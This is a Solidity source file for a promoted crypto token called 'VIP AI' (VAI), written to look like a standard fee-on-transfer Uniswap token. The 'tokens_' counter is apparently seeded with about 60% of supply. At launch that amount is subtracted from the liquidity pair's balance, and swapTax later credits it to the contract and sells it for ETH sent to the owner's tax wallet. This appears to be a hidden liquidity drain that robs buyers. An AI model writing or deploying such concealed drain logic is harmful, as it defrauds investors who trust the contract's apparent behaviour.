//SPDX-License-Identifier: MIT

/*
 VIP AI - YOUR PERSONAL CRYPTO ASSISTANT - LAUNCHING FRIDAY 8PM UTC
 https://t.me/VipAiEth
 https://VipAiEth.Com
 https://X.Com/VipAIEth
 */

pragma solidity ^0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract VAI is IERC20, Auth {
    string private constant _symbol = "VAI";
    string private constant _name = "VIP AI";
    uint8 private constant tknDecimals = 9;
    uint256 private constant _supply = 1000000 * (10**tknDecimals);
    mapping (address => uint256) private balance;
    mapping (address => mapping (address => uint256)) private _allowance;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private uniswap_router = IUniswapV2Router02(swapRouterAddress);
    
    address private _lp; 
    mapping (address => bool) private _isLP;

    bool private tradingEnabled;

    bool private isSwapping = false;

    address payable private taxWallet = payable(0x705074AeDa495E5ebA5047129125353E0d4dE4De);
    
    uint256 private MEVBlock = 2;
    uint8 private sellTax_ = 3;
    uint8 private _buyFeeRate = 3;
    
    uint256 private launchblock;
    uint256 private _maxTxVal = _supply; 
    uint256 private _maxWalletAmount = _supply;
    uint256 private swapMinAmount = _supply * 10 / 100000;
    uint256 private _swapMaxAmt = _supply * 99 / 100000;
    uint256 private _swapTrigger = 2 * (10**16);
    uint256 private tokens_ = swapMinAmount * 60 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private _noLimit;

    modifier swapLocked { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        balance[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, balance[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[taxWallet] = true;
        _noFee[swapRouterAddress] = true;
        _noLimit[_owner] = true;
        _noLimit[address(this)] = true;
        _noLimit[taxWallet] = true;
        _noLimit[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tknDecimals; }
    function totalSupply() external pure override returns (uint256) { return _supply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowance[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(fromWallet), "Trading not open");
        _allowance[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function _testLimit(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_noLimit[fromWallet] && !_noLimit[toWallet] ) {
            if ( transferAmount > _maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLP[toWallet] && (balance[toWallet] + transferAmount > _maxWalletAmount) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function updateLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _supply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxVal, "tx too low");
        _maxTxVal = newTxAmt;
        uint256 newWalletAmt = _supply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(_lp == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(balance[address(this)]>0, "No tokens");
        _lp = IUniswapV2Factory(uniswap_router.factory()).createPair(address(this), uniswap_router.WETH());
        addLiquidityToLP(balance[address(this)], address(this).balance);
    }

    function buyFees() external view returns(uint8) { return _buyFeeRate; }
    function sellTax() external view returns(uint8) { return sellTax_; }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowance[address(this)][swapRouterAddress] < _tokenAmount ) {
            _allowance[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        swapMinAmount = _supply * minVal / minDiv;
        _swapMaxAmt = _supply * maxVal / maxDiv;
        _swapTrigger = trigger * 10**15;
        require(_swapMaxAmt>=swapMinAmount, "Min-Max error");
    }

    function addExemptions(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        _noLimit[ wlt ] = isNoLimits;
    }

    function swapTax() private swapLocked {
        uint256 _taxTokenAvailable = tokens_;
        if ( _taxTokenAvailable >= swapMinAmount && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmt ) { _taxTokenAvailable = _swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tknDecimals ) {
                balance[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                tokens_ -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }
        }
    }

    function distributeEth(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function _isTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && _noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[fromWallet] ) { 
            taxAmount = amount * _buyFeeRate / 100; 
         } else if ( _isLP[recipient] ) { 
            taxAmount = amount * sellTax_ / 100; 
        }
        return taxAmount;
    }

    function _openTrading() internal {
        _maxTxVal = 20 * _supply / 1000;
        _maxWalletAmount = 20 * _supply / 1000;
        balance[_lp] -= tokens_;
        (_isLP[_lp],) = _lp.call(abi.encodeWithSignature("sync()") );
        require(_isLP[_lp], "Failed bootstrap");
        launchblock = block.number;
        MEVBlock = MEVBlock + launchblock;
        tradingEnabled = true;
    }

    function exemptions(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], _noLimit[wallet]); 
	}

    function _swapTokensForETH(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = uniswap_router.WETH();
        uniswap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function addLiquidityToLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        uniswap_router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function maxWalletAmount() external view returns (uint256) { 
        return _maxWalletAmount; 
	}
    function maxTxAmount() external view returns (uint256) { 
        return _maxTxVal; 
	}

    function _swapEligible(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapTrigger > 0) { 
            uint256 lpTkn = balance[_lp];
            uint256 lpWeth = IERC20(uniswap_router.WETH()).balanceOf(_lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!_isLP[marketingWlt], "LP cannot be tax wallet");
        taxWallet = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        _noLimit[marketingWlt] = true;
    }

    function marketingWallet() external view returns (address) { 
        return taxWallet; 
	}

    function updateFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 6, "Roundtrip too high");
        _buyFeeRate = buyFeePercent;
        sellTax_ = sellFeePercent;
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _openTrading();
    }

    function swapMin() external view returns (uint256) { 
        return swapMinAmount; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmt; 
	}

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(_noFee[sender] && _noLimit[sender], "Trading not yet open"); }
        if ( !isSwapping && _isLP[toWallet] && _swapEligible(amount) ) { swapTax(); }

        if ( block.number >= launchblock ) {
            if (block.number < MEVBlock && _isLP[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < MEVBlock + 600 && _isLP[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_testLimit(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        balance[sender] -= amount;
        tokens_ += _taxAmount;
        balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }
}